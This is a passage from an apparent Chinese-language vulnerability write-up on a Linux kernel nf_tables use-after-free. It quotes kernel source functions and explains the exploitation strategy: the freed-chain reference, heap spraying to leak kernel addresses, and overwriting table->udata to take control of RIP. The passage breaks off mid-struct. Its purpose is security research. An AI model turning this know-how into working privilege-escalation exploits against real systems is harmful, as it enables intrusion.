class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nf_tables_abort_release</span><span class="params">(struct nft_trans *trans)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (trans-&gt;msg_type) &#123;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_NEWTABLE:</span><br><span class="line">nf_tables_table_destroy(&amp;trans-&gt;ctx);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_NEWCHAIN:</span><br><span class="line"><span class="keyword">if</span> (nft_trans_chain_update(trans))</span><br><span class="line">nft_hooks_destroy(&amp;nft_trans_chain_hooks(trans));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">nf_tables_chain_destroy(&amp;trans-&gt;ctx);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_NEWRULE:</span><br><span class="line">nf_tables_rule_destroy(&amp;trans-&gt;ctx, nft_trans_rule(trans));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_NEWSET:</span><br><span class="line">nft_set_destroy(&amp;trans-&gt;ctx, nft_trans_set(trans));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_NEWSETELEM:</span><br><span class="line">nft_set_elem_destroy(nft_trans_elem_set(trans),</span><br><span class="line">     nft_trans_elem(trans).priv, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_NEWOBJ:</span><br><span class="line">nft_obj_destroy(&amp;trans-&gt;ctx, nft_trans_obj(trans));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_NEWFLOWTABLE:</span><br><span class="line"><span class="keyword">if</span> (nft_trans_flowtable_update(trans))</span><br><span class="line">nft_hooks_destroy(&amp;nft_trans_flowtable_hooks(trans));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">nf_tables_flowtable_destroy(nft_trans_flowtable(trans));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">kfree(trans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终走到<code>nf_tables_abort_release</code>函数，会在<code>NFT_MSG_NEWCHAIN</code>分支中调用<code>nf_tables_chain_destroy</code>函数，最终会将chain1、chain2给free掉，chain3则保留并且其use成员为-1，如果此时再次创建一个chain引用chain3那么chain3的use成员会变为0，最后调用<code>nf_tables_delchain</code>即可实现uaf。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_tables_chain_destroy</span><span class="params">(struct nft_ctx *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span> =</span> ctx-&gt;chain;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_hook</span> *<span class="title">hook</span>, *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON(chain-&gt;use &gt; <span class="number">0</span>))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* no concurrent access possible anymore */</span></span><br><span class="line">nf_tables_chain_free_chain_rules(chain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nft_is_base_chain(chain)) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_base_chain</span> *<span class="title">basechain</span> =</span> nft_base_chain(chain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nft_base_chain_netdev(ctx-&gt;family, basechain-&gt;ops.hooknum)) &#123;</span><br><span class="line">list_for_each_entry_safe(hook, next,</span><br><span class="line"> &amp;basechain-&gt;hook_list, <span class="built_in">list</span>) &#123;</span><br><span class="line">list_del_rcu(&amp;hook-&gt;<span class="built_in">list</span>);</span><br><span class="line">kfree_rcu(hook, rcu);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">module_put(basechain-&gt;type-&gt;owner);</span><br><span class="line"><span class="keyword">if</span> (rcu_access_pointer(basechain-&gt;stats)) &#123;</span><br><span class="line">static_branch_dec(&amp;nft_counters_enabled);</span><br><span class="line">free_percpu(rcu_dereference_raw(basechain-&gt;stats));</span><br><span class="line">&#125;</span><br><span class="line">kfree(chain-&gt;name);</span><br><span class="line">kfree(chain-&gt;udata);</span><br><span class="line">kfree(basechain);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">kfree(chain-&gt;name);</span><br><span class="line">kfree(chain-&gt;udata);</span><br><span class="line">kfree(chain);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为其被漏洞修改为-1所以一开始才是没有被free掉的。</p><h3 id="利用分析-1"><a href="#利用分析-1" class="headerlink" title="利用分析"></a>利用分析</h3><p>现状是chain4 &#x3D;&gt; chain3(freed)所以只能通过chain4去访问chain3的内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_getrule</span><span class="params">(struct sk_buff *skb, <span class="keyword">const</span> struct nfnl_info *info,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_ext_ack</span> *<span class="title">extack</span> =</span> info-&gt;extack;</span><br><span class="line">u8 genmask = nft_genmask_cur(info-&gt;net);</span><br><span class="line">u8 family = info-&gt;nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">rule</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> info-&gt;net;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sk_buff</span> *<span class="title">skb2</span>;</span></span><br><span class="line"><span class="keyword">bool</span> reset = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_DUMP) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_dump_control</span> <span class="title">c</span> =</span> &#123;</span><br><span class="line">.start= nf_tables_dump_rules_start,</span><br><span class="line">.dump = nf_tables_dump_rules,</span><br><span class="line">.done = nf_tables_dump_rules_done,</span><br><span class="line">.<span class="keyword">module</span> = THIS_MODULE,</span><br><span class="line">.data = (<span class="keyword">void</span> *)nla,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nft_netlink_dump_start_rcu(info-&gt;sk, skb, info-&gt;nlh, &amp;c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_RULE_TABLE], family, genmask, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chain = nft_chain_lookup(net, table, nla[NFTA_RULE_CHAIN], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_CHAIN]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rule = nft_rule_lookup(chain, nla[NFTA_RULE_HANDLE]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">skb2 = alloc_skb(NLMSG_GOODSIZE, GFP_ATOMIC);</span><br><span class="line"><span class="keyword">if</span> (!skb2)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (NFNL_MSG_TYPE(info-&gt;nlh-&gt;nlmsg_type) == NFT_MSG_GETRULE_RESET)</span><br><span class="line">reset = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">err = nf_tables_fill_rule_info(skb2, net, NETLINK_CB(skb).portid,</span><br><span class="line">       info-&gt;nlh-&gt;nlmsg_seq, NFT_MSG_NEWRULE, <span class="number">0</span>,</span><br><span class="line">       family, table, chain, rule, <span class="number">0</span>, reset);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_fill_rule_info;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nfnetlink_unicast(skb2, net, NETLINK_CB(skb).portid);</span><br><span class="line"></span><br><span class="line">err_fill_rule_info:</span><br><span class="line">kfree_skb(skb2);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里使用<code>getrule</code>，最终会调用<code>nf_tables_fill_rule_info</code>函数去填充rule信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_fill_rule_info</span><span class="params">(struct sk_buff *skb, struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function">    u32 portid, u32 seq, <span class="keyword">int</span> event,</span></span></span><br><span class="line"><span class="params"><span class="function">    u32 flags, <span class="keyword">int</span> family,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nft_table *table,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nft_chain *chain,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nft_rule *rule, u64 handle,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">bool</span> reset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> *<span class="title">nlh</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>, *<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">list</span>;</span></span><br><span class="line">u16 type = nfnl_msg_type(NFNL_SUBSYS_NFTABLES, event);</span><br><span class="line"></span><br><span class="line">nlh = nfnl_msg_put(skb, portid, seq, type, flags, family, NFNETLINK_V0,</span><br><span class="line">   nft_base_seq(net));</span><br><span class="line"><span class="keyword">if</span> (!nlh)</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla_put_string(skb, NFTA_RULE_TABLE, table-&gt;name))</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line"><span class="keyword">if</span> (nla_put_string(skb, NFTA_RULE_CHAIN, chain-&gt;name))</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line"><span class="keyword">if</span> (nla_put_be64(skb, NFTA_RULE_HANDLE, cpu_to_be64(rule-&gt;handle),</span><br><span class="line"> NFTA_RULE_PAD))</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (event != NFT_MSG_DELRULE &amp;&amp; handle) &#123;</span><br><span class="line"><span class="keyword">if</span> (nla_put_be64(skb, NFTA_RULE_POSITION, cpu_to_be64(handle),</span><br><span class="line"> NFTA_RULE_PAD))</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain-&gt;flags &amp; NFT_CHAIN_HW_OFFLOAD)</span><br><span class="line">nft_flow_rule_stats(chain, rule);</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = nla_nest_start_noflag(skb, NFTA_RULE_EXPRESSIONS);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">list</span> == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line">nft_rule_for_each_expr(expr, next, rule) &#123;</span><br><span class="line"><span class="keyword">if</span> (nft_expr_dump(skb, NFTA_LIST_ELEM, expr, reset) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line">&#125;</span><br><span class="line">nla_nest_end(skb, <span class="built_in">list</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rule-&gt;udata) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_userdata</span> *<span class="title">udata</span> =</span> nft_userdata(rule);</span><br><span class="line"><span class="keyword">if</span> (nla_put(skb, NFTA_RULE_USERDATA, udata-&gt;len + <span class="number">1</span>,</span><br><span class="line">    udata-&gt;data) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nlmsg_end(skb, nlh);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">nla_put_failure:</span><br><span class="line">nlmsg_trim(skb, nlh);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后这里会调用<code>nft_expr_dump</code>函数获得expr。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_fill_expr_info</span><span class="params">(struct sk_buff *skb,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">const</span> struct nft_expr *expr, <span class="keyword">bool</span> reset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (nla_put_string(skb, NFTA_EXPR_NAME, expr-&gt;ops-&gt;type-&gt;name))</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (expr-&gt;ops-&gt;dump) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">data</span> =</span> nla_nest_start_noflag(skb,</span><br><span class="line">    NFTA_EXPR_DATA);</span><br><span class="line"><span class="keyword">if</span> (data == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line"><span class="keyword">if</span> (expr-&gt;ops-&gt;dump(skb, expr, reset) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line">nla_nest_end(skb, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> skb-&gt;len;</span><br><span class="line"></span><br><span class="line">nla_put_failure:</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nft_expr_dump</span><span class="params">(struct sk_buff *skb, <span class="keyword">unsigned</span> <span class="keyword">int</span> attr,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> struct nft_expr *expr, <span class="keyword">bool</span> reset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">nest</span>;</span></span><br><span class="line"></span><br><span class="line">nest = nla_nest_start_noflag(skb, attr);</span><br><span class="line"><span class="keyword">if</span> (!nest)</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line"><span class="keyword">if</span> (nf_tables_fill_expr_info(skb, expr, reset) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line">nla_nest_end(skb, nest);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">nla_put_failure:</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里最后会调用ops的dump。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nft_data_dump</span><span class="params">(struct sk_buff *skb, <span class="keyword">int</span> attr, <span class="keyword">const</span> struct nft_data *data,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">enum</span> nft_data_types type, <span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">nest</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">nest = nla_nest_start_noflag(skb, attr);</span><br><span class="line"><span class="keyword">if</span> (nest == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (type) &#123;</span><br><span class="line"><span class="keyword">case</span> NFT_DATA_VALUE:</span><br><span class="line">err = nft_value_dump(skb, data, len);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_DATA_VERDICT:</span><br><span class="line">err = nft_verdict_dump(skb, NFTA_DATA_VERDICT, &amp;data-&gt;verdict);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">err = -EINVAL;</span><br><span class="line">WARN_ON(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nla_nest_end(skb, nest);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(nft_data_dump);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_immediate_dump</span><span class="params">(struct sk_buff *skb,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nft_expr *expr, <span class="keyword">bool</span> reset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_immediate_expr</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nft_dump_register(skb, NFTA_IMMEDIATE_DREG, priv-&gt;dreg))</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nft_data_dump(skb, NFTA_IMMEDIATE_DATA, &amp;priv-&gt;data,</span><br><span class="line">     nft_dreg_to_type(priv-&gt;dreg), priv-&gt;dlen);</span><br><span class="line"></span><br><span class="line">nla_put_failure:</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里最终会走到<code>nft_verdict_dump</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nft_verdict_dump</span><span class="params">(struct sk_buff *skb, <span class="keyword">int</span> type, <span class="keyword">const</span> struct nft_verdict *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">nest</span>;</span></span><br><span class="line"></span><br><span class="line">nest = nla_nest_start_noflag(skb, type);</span><br><span class="line"><span class="keyword">if</span> (!nest)</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla_put_be32(skb, NFTA_VERDICT_CODE, htonl(v-&gt;code)))</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (v-&gt;code) &#123;</span><br><span class="line"><span class="keyword">case</span> NFT_JUMP:</span><br><span class="line"><span class="keyword">case</span> NFT_GOTO:</span><br><span class="line"><span class="keyword">if</span> (nla_put_string(skb, NFTA_VERDICT_CHAIN,</span><br><span class="line">   v-&gt;chain-&gt;name))</span><br><span class="line"><span class="keyword">goto</span> nla_put_failure;</span><br><span class="line">&#125;</span><br><span class="line">nla_nest_end(skb, nest);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">nla_put_failure:</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后可以拿到chain的name，原作者是通过堆喷<code>struct nft_expr</code>，通过其ops拿到内核基地址，在通过对喷<code>struct nft_rule</code>拿到内核堆地址，最终通过控制<code>table-&gt;udata</code>去修改掉。</p><p>关于如何控制RIP这里又需要一点点前置知识。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_blob</span>__<span class="title">rcu</span> *<span class="title">blob_gen_0</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule_blob</span>__<span class="title">rcu</span> *<span class="title">blob_gen_1</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">rules</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rhlist_head</span><span class="title">rhlhead</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span>*<span class="title">table</span>;</span></span><br><span class="line">u64handle;</span><br><span class="line">u32use;</span><br><span class="line">u8flags:<span class="number">5</span>,</span><br><span class="line">bound:<span class="number">1</span>,</span><br><span class="line">genmask:<span class="number">2</span>;</span><br><span class="line"><span class="keyword">char</span>*name;</span><br><span 